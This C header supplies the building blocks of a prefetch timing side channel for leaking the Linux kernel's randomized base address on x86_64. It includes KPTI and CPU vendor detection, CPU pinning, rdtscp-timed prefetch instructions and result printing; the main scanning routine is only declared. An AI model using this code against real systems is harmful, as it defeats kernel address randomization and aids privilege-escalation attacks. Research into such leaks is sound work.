#ifndef PREFETCH_H
#define PREFETCH_H

#if !defined(__x86_64__) && !defined(__amd64__)
#error "prefetch: x86_64 only"
#endif

#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PAGE_SIZE 0x1000ul
#define KB 0x400ul
#define MB 0x100000ul
#define GB 0x40000000ul
#define TB 0x10000000000ul

#define KERNEL_BASE_MIN 0xffffffff80000000ul
#define KERNEL_BASE_MAX 0xffffffffc0000000ul
#define KERNEL_ALIGN (2 * MB)

#define KASLD_ADDR_VIRT 'V'
#define KASLD_SECTION_TEXT "text"
#define KASLD_REGION_KERNEL_TEXT "kernel_text"

#define CPU_VENDOR_UNKNOWN 0
#define CPU_VENDOR_AMD 1
#define CPU_VENDOR_INTEL 2

__attribute__((unused)) static int detect_cpu_vendor(void) {
  FILE *f = fopen("/proc/cpuinfo", "r");
  if (!f)
    return CPU_VENDOR_UNKNOWN;

  char *line = NULL;
  size_t len = 0;
  int cpu = CPU_VENDOR_UNKNOWN;
  while (getline(&line, &len, f) != -1) {
    if (strstr(line, "vendor") == NULL)
      continue;
    if (strstr(line, "AuthenticAMD") != NULL) {
      cpu = CPU_VENDOR_AMD;
      break;
    }
    if (strstr(line, "GenuineIntel") != NULL) {
      cpu = CPU_VENDOR_INTEL;
      break;
    }
  }
  free(line);
  fclose(f);
  return cpu;
}

__attribute__((unused)) static bool detect_kpti(void) {
  FILE *f = fopen("/proc/cpuinfo", "r");
  if (!f)
    return false;

  char *line = NULL;
  size_t len = 0;
  bool pti = false;
  while (getline(&line, &len, f) != -1) {
    if (strstr(line, "flags") == NULL)
      continue;
    if (strstr(line, " pti") != NULL) {
      pti = true;
      break;
    }
  }
  free(line);
  fclose(f);
  return pti;
}

__attribute__((unused)) static int has_rdtscp(void) {
  unsigned int eax, ebx, ecx, edx;
  __asm__ volatile("cpuid"
                   : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                   : "a"(0x80000001)
                   :);
  return (edx >> 27) & 1;
}

__attribute__((unused)) static void pin_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

__attribute__((unused)) static uint64_t time_prefetch(uint64_t addr) {
  uint64_t t0_lo, t0_hi, t1_lo, t1_hi;

  __asm__ volatile(".intel_syntax noprefix;"
                   "mfence;"
                   "rdtscp;"
                   "mov %0, rax;"
                   "mov %1, rdx;"
                   "xor rax, rax;"
                   "lfence;"
                   "prefetchnta qword ptr [%4];"
                   "prefetcht2 qword ptr [%4];"
                   "xor rax, rax;"
                   "lfence;"
                   "rdtscp;"
                   "mov %2, rax;"
                   "mov %3, rdx;"
                   "mfence;"
                   ".att_syntax;"
                   : "=r"(t0_lo), "=r"(t0_hi), "=r"(t1_lo), "=r"(t1_hi)
                   : "r"(addr)
                   : "rax", "rbx", "rcx", "rdx");

  uint64_t t0 = (t0_hi << 32) | t0_lo;
  uint64_t t1 = (t1_hi << 32) | t1_lo;
  return t1 - t0;
}

static inline void kasld_result(char type, const char *section,
                                unsigned long addr, const char *region,
                                const char *name) {
  if (!region)
    region = "";
  if (name && *name)
    printf("[+] %c %s 0x%016lx %s:%s\n", type, section, addr, region, name);
  else
    printf("[+] %c %s 0x%016lx %s\n", type, section, addr, region);
}

__attribute__((constructor)) static void prefetch_init_buffering(void) {
  setvbuf(stdout, NULL, _IOLBF, 0);
}

unsigned long get_kernel_addr_prefetch(void);

#endif /* PREFETCH_H */
